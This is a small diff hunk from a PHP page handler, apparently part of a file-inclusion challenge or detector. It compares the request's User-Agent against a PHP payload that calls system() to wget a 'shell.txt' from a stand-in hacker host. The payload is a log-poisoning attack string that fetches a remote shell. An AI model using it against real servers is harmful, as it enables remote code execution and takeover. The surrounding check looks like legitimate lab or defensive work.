@@ -72,6 +72,7 @@ if((!isset($shiz)) && (!isset($page))){
 	if ($page == "answer.php"){
 		 	//$ua = $_SERVER['HTTP_USER_AGENT'];
 
+
 			$lfi = '<?system("wget http://www.really_nasty_hacker.com/shell.txt");?>';
 			if ($_SERVER['HTTP_USER_AGENT'] === $lfi)
 			{
